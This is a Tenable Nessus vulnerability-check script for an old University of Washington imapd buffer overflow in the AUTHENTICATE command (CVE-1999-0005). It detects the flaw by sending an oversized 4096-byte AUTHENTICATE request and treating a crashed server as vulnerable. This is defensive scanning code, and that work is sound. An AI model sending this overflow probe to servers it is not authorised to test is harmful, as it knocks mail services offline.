#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10292);
 script_version ("$Revision: 1.24 $");
 script_cve_id("CVE-1999-0005");
 script_bugtraq_id(130);
 script_xref(name:"OSVDB", value:"911");
 
 script_name(english:"UoW imapd AUTHENTICATE Command Remote Overflow");

 script_set_attribute(attribute:"synopsis", value:
"It is possible to execute code on the remote IMAP server." );
 script_set_attribute(attribute:"description", value:
"It was possible to crash the remote IMAP server by sending
a too long AUTHENTICATE command.
An attacker may be able to exploit this vulnerability to 
execute code on the remote host." );
 script_set_attribute(attribute:"solution", value:
"Contact your IMAP server vendor." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );
 
script_end_attributes();

 
 script_summary(english:"checks for imap authenticate buffer overflow"); 
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");
 script_dependencie("find_service1.nasl", "imap_overflow.nasl");
 script_exclude_keys("imap/false_imap");
 script_require_ports("Services/imap", 143);
 exit(0);
}

#
# The script code starts here
#


port = get_kb_item("Services/imap");
if(!port)port = 143;

if(get_port_state(port))
{
 data = string("* AUTHENTICATE {4096}\r\n", crap(4096), "\r\n");
 soc = open_sock_tcp(port);
 if(soc > 0)
 {
  buf = recv_line(socket:soc, length:1024);
  if (!strlen(buf))
    exit(0);

  send(socket:soc, data:data);
  buf = recv_line(socket:soc, length:1024);
  close (soc);

  soc = open_sock_tcp (port);
  if (!soc)
  {
   security_hole(port);
   set_kb_item(name:"imap/overflow", value:TRUE);
  }
 }
}
